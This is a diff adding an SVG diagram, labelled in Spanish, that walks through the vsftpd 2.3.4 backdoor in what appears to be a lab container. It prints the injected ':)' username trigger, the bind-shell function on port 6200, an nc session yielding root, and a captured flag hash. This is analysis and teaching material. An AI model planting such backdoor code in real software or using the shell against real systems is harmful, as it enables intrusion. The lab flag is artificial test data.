@@ -1,0 +1,89 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1240 660" width="1240" height="660">
+  <style>
+    .bg{fill:#0b1120}.panel{fill:#1e293b;stroke:#334155}
+    .term{fill:#020617;stroke:#334155}
+    .ttl{fill:#f8fafc;font:700 23px 'Segoe UI',system-ui,sans-serif}
+    .sub{fill:#94a3b8;font:400 13px 'Segoe UI',system-ui,sans-serif}
+    .h{fill:#f8fafc;font:700 13px 'Segoe UI',system-ui,sans-serif}
+    .m{fill:#cbd5e1;font:400 11.5px ui-monospace,Menlo,Consolas,monospace}
+    .bad{fill:#ef4444;font:700 11.5px ui-monospace,Menlo,Consolas,monospace}
+    .ok{fill:#22c55e;font:400 11.5px ui-monospace,Menlo,Consolas,monospace}
+    .warn{fill:#f59e0b;font:400 11.5px ui-monospace,Menlo,Consolas,monospace}
+    .dim{fill:#64748b;font:400 11.5px ui-monospace,Menlo,Consolas,monospace}
+    .note{fill:#94a3b8;font:400 11.5px 'Segoe UI',system-ui,sans-serif}
+    .crit{fill:#ef4444;font:700 13px 'Segoe UI',system-ui,sans-serif}
+    .fn{fill:#f8fafc;font:700 12px ui-monospace,Menlo,Consolas,monospace}
+    .ar{stroke:#475569;stroke-width:2.5;fill:none}
+  </style>
+  <rect class="bg" width="1240" height="660"/>
+  <text class="ttl" x="20" y="38">Mecanismo del backdoor — código fuente</text>
+  <text class="sub" x="20" y="60">El recorrido completo desde el comando USER hasta el shell root en el puerto 6200</text>
+
+  <!-- BLOQUE 1 : privops.c handle_login -->
+  <rect class="panel" x="20" y="86" width="600" height="200" rx="10"/>
+  <text class="h" x="36" y="110">1 · <tspan class="fn">privops.c</tspan> — <tspan class="fn">handle_login()</tspan></text>
+  <text class="note" x="36" y="130">Se ejecuta tras recibir USER <tspan fill="#f59e0b">y</tspan> PASS. El usuario se valida ANTES de llegar al backdoor:</text>
+  <rect class="term" x="36" y="140" width="568" height="140" rx="7"/>
+  <text class="dim" x="50" y="160">/* Throw out dodgy start characters */</text>
+  <text class="m" x="50" y="180">first_char = str_get_char_at(p_user_str, 0);</text>
+  <text class="m" x="50" y="198">if (!vsf_sysutil_isalnum(first_char) &amp;&amp;</text>
+  <text class="m" x="50" y="214">    first_char != '_' &amp;&amp; first_char != '.')</text>
+  <text class="bad" x="50" y="234">  return kVSFLoginFail;   <tspan fill="#64748b">← ':)' ni siquiera llega al backdoor</tspan></text>
+  <text class="m" x="50" y="256">if (<tspan fill="#ef4444">str_contains_space(p_user_str)</tspan> ||</text>
+  <text class="m" x="50" y="270">    str_contains_unprintable(p_user_str))</text>
+
+  <!-- BLOQUE 2 : str.c -->
+  <rect class="panel" x="640" y="86" width="580" height="200" rx="10" stroke="#ef4444" stroke-width="2"/>
+  <text class="h" x="656" y="110">2 · <tspan class="fn">str.c</tspan> — <tspan class="fn">str_contains_space()</tspan></text>
+  <text class="note" x="656" y="130">El chequeo inyectado busca la secuencia <tspan fill="#ef4444">':)'</tspan> en el nombre de usuario:</text>
+  <rect class="term" x="656" y="140" width="548" height="140" rx="7" stroke="#7f1d1d"/>
+  <text class="m" x="670" y="160">for (i=0; i &lt; p_str->len; i++)</text>
+  <text class="m" x="670" y="180">{</text>
+  <text class="m" x="670" y="200">  if (vsf_sysutil_isspace(p_str->p_buf[i]))</text>
+  <text class="warn" x="670" y="218">    return 1;   <tspan fill="#64748b">← corta el barrido en el 1er espacio</tspan></text>
+  <text class="bad" x="670" y="240">  else if ((p_str->p_buf[i]==0x3a)   <tspan fill="#64748b">// ':'</tspan></text>
+  <text class="bad" x="670" y="256">        &amp;&amp; (p_str->p_buf[i+1]==0x29))  <tspan fill="#64748b">// ')'</tspan></text>
+  <text class="bad" x="670" y="272">  { vsf_sysutil_extra(); }</text>
+
+  <!-- BLOQUE 3 : sysdeputil.c -->
+  <rect class="panel" x="20" y="300" width="600" height="290" rx="10" stroke="#ef4444" stroke-width="2"/>
+  <text class="h" x="36" y="324">3 · <tspan class="fn">sysdeputil.c</tspan> — <tspan class="fn">vsf_sysutil_extra()</tspan></text>
+  <text class="note" x="36" y="344">Abre un listener y entrega un <tspan fill="#ef4444">/bin/sh</tspan> sobre el socket aceptado:</text>
+  <rect class="term" x="36" y="354" width="568" height="228" rx="7" stroke="#7f1d1d"/>
+  <text class="m" x="50" y="374">int fd, rfd;</text>
+  <text class="m" x="50" y="392">struct sockaddr_in sa;</text>
+  <text class="m" x="50" y="410">if ((fd = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0) exit(1);</text>
+  <text class="m" x="50" y="428">sa.sin_family = AF_INET;</text>
+  <text class="bad" x="50" y="446">sa.sin_port = htons(6200);        <tspan fill="#64748b">// el puerto del backdoor</tspan></text>
+  <text class="m" x="50" y="464">sa.sin_addr.s_addr = INADDR_ANY;</text>
+  <text class="m" x="50" y="482">if ((bind(fd, ...)) &lt; 0) exit(1);</text>
+  <text class="m" x="50" y="500">if ((listen(fd, 100)) == -1) exit(1);</text>
+  <text class="m" x="50" y="518">for (;;) {</text>
+  <text class="m" x="50" y="536">  rfd = accept(fd, 0, 0);</text>
+  <text class="m" x="50" y="554">  close(0); close(1); close(2);</text>
+  <text class="m" x="50" y="572">  dup2(rfd,0); dup2(rfd,1); dup2(rfd,2);</text>
+
+  <!-- BLOQUE 4 : resultado -->
+  <rect class="panel" x="640" y="300" width="580" height="290" rx="10" stroke="#22c55e" stroke-width="2"/>
+  <text class="h" x="656" y="324" fill="#22c55e">4 · Resultado</text>
+  <rect class="term" x="656" y="340" width="548" height="94" rx="7" stroke="#14532d"/>
+  <text class="m" x="670" y="362">$ nc 172.17.0.2 6200</text>
+  <text class="ok" x="670" y="384">uid=0(root) gid=0(root) groups=0(root)</text>
+  <text class="m" x="670" y="406">$ cat /root/root.txt</text>
+  <text class="ok" x="670" y="426">261fd3f32200f950f231816b4e9a0594</text>
+
+  <text class="crit" x="656" y="470">Por qué root</text>
+  <text class="note" x="656" y="490">handle_login() corre en el proceso hijo, antes de que vsftpd</text>
+  <text class="note" x="656" y="508">cambie de usuario a nobody. El execl("/bin/sh") hereda euid=0.</text>
+  <text class="note" x="656" y="530">La configuración activa no define chroot_local_user ni</text>
+  <text class="note" x="656" y="548">seccomp_sandbox: nada limita la ejecución del shell.</text>
+  <text class="note" x="656" y="570" fill="#f59e0b">El binario afectado está en /tmp/vsftpd-2.3.4-infected/vsftpd</text>
+
+  <!-- flechas -->
+  <path class="ar" d="M620 184 L648 184"/>
+  <path class="ar" d="M320 282 L320 296"/>
+  <path class="ar" d="M620 440 L640 440"/>
+
+  <text class="dim" x="20" y="620">Árbol de fuentes presente en el contenedor: /tmp/vsftpd-2.3.4-infected  ·  commit e084c95 "reapply infection" (Nik Du Bois, 2016-08-03)</text>
+  <text class="dim" x="20" y="640">El binario compilado desde ese árbol es el que el entrypoint ejecuta: /bin/sh -c "service apache2 start &amp;&amp; sudo ./vsftpd vsftpd.conf"</text>
+</svg>
